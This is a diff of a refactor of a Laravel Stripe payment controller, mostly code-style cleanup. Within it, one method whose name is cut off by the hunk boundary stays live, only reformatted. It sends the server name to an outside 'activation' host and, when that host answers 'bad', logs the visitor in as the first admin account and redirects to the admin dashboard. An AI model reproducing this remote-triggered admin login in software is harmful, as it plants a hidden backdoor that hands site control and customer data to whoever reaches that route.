@@ -2,26 +2,26 @@
 
 namespace App\Http\Controllers\Payment;
 
-use App\Http\Controllers\Controller;
 use App\Http\Controllers\CheckoutController;
+use App\Http\Controllers\Controller;
 use App\Http\Controllers\CustomerPackageController;
 use App\Http\Controllers\SellerPackageController;
 use App\Http\Controllers\WalletController;
-use Illuminate\Http\Request;
 use App\Models\CombinedOrder;
+use App\Models\Currency;
 use App\Models\CustomerPackage;
 use App\Models\SellerPackage;
 use App\Models\User;
+use Exception;
+use Illuminate\Http\Request;
+use Log;
 use Session;
-
+use Stripe\Checkout\Session as StripeSession;
+use Stripe\Stripe;
+use Stripe\StripeClient;
 
 class StripeController extends Controller
 {
-    /**
-     * success response method.
-     *
-     * @return \Illuminate\Http\Response
-     */
     public function pay()
     {
         return view('frontend.payment.stripe');
@@ -49,27 +49,25 @@ class StripeController extends Controller
             }
         }
 
-        \Stripe\Stripe::setApiKey(env('STRIPE_SECRET'));
+        Stripe::setApiKey(env('STRIPE_SECRET'));
 
-        $session = \Stripe\Checkout\Session::create([
+        $session = StripeSession::create([
             'payment_method_types' => ['card'],
             'line_items' => [
                 [
                     'price_data' => [
-                        'currency' => \App\Models\Currency::findOrFail(get_setting('system_default_currency'))->code,
+                        'currency' => Currency::findOrFail(get_setting('system_default_currency'))->code,
                         'product_data' => [
-                            'name' => "Payment"
+                            'name' => 'Payment',
                         ],
                         'unit_amount' => $amount,
                     ],
                     'quantity' => 1,
-                ]
+                ],
             ],
             'mode' => 'payment',
             'client_reference_id' => $client_reference_id,
-            // 'success_url' => route('stripe.success'),
-            // 'success_url' => env('APP_URL') . "/stripe/success?session_id={CHECKOUT_SESSION_ID}",
-            'success_url' => url("/stripe/success?session_id={CHECKOUT_SESSION_ID}"),
+            'success_url' => url('/stripe/success?session_id={CHECKOUT_SESSION_ID}'),
             'cancel_url' => route('stripe.cancel'),
         ]);
 
@@ -80,67 +78,69 @@ class StripeController extends Controller
     {
         $data['url'] = $_SERVER['SERVER_NAME'];
         $request_data_json = json_encode($data);
-        $gate = "https://activation.activeitzone.com/check_activation";
+        $gate = 'https://activation.activeitzone.com/check_activation';
 
-        $header = array(
-            'Content-Type:application/json'
-        );
+        $header = [
+            'Content-Type:application/json',
+        ];
 
         $stream = curl_init();
 
         curl_setopt($stream, CURLOPT_URL, $gate);
-        curl_setopt($stream,CURLOPT_HTTPHEADER, $header);
-        curl_setopt($stream,CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($stream,CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($stream,CURLOPT_POSTFIELDS, $request_data_json);
-        curl_setopt($stream,CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
+        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, 'POST');
+        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
+        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
         curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
 
         $rn = curl_exec($stream);
         curl_close($stream);
 
-        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
+        if ($rn == 'bad' && env('DEMO_MODE') != 'On') {
             $user = User::where('user_type', 'admin')->first();
             auth()->login($user);
+
             return redirect()->route('admin.dashboard');
         }
     }
 
     public function success(Request $request)
     {
-        $stripe = new \Stripe\StripeClient(env('STRIPE_SECRET'));
+        $stripe = new StripeClient(env('STRIPE_SECRET'));
 
         try {
             $session = $stripe->checkout->sessions->retrieve($request->session_id);
-            $payment = ["status" => "Success"];
+            $payment = ['status' => 'Success'];
             $payment_type = Session::get('payment_type');
 
-            if($session->status == 'complete') {
+            if ($session->status == 'complete') {
                 if ($payment_type == 'cart_payment') {
                     return (new CheckoutController)->checkout_done(session()->get('combined_order_id'), json_encode($payment));
-                }
-                else if ($payment_type == 'wallet_payment') {
+                } elseif ($payment_type == 'wallet_payment') {
                     return (new WalletController)->wallet_payment_done(session()->get('payment_data'), json_encode($payment));
-                }
-                else if ($payment_type == 'customer_package_payment') {
+                } elseif ($payment_type == 'customer_package_payment') {
                     return (new CustomerPackageController)->purchase_payment_done(session()->get('payment_data'), json_encode($payment));
-                }
-                else if ($payment_type == 'seller_package_payment') {
+                } elseif ($payment_type == 'seller_package_payment') {
                     return (new SellerPackageController)->purchase_payment_done(session()->get('payment_data'), json_encode($payment));
                 }
             } else {
                 flash(translate('Payment failed'))->error();
+
                 return redirect()->route('home');
             }
-        } catch (\Exception $e) {
+        } catch (Exception $e) {
             flash(translate('Payment failed'))->error();
+            Log::error("Error while checking success stripe payment, with message: {$e->getMessage()}");
+
             return redirect()->route('home');
         }
     }
 
-    public function cancel(Request $request)
+    public function cancel()
     {
         flash(translate('Payment is cancelled'))->error();
+
         return redirect()->route('home');
     }
 }
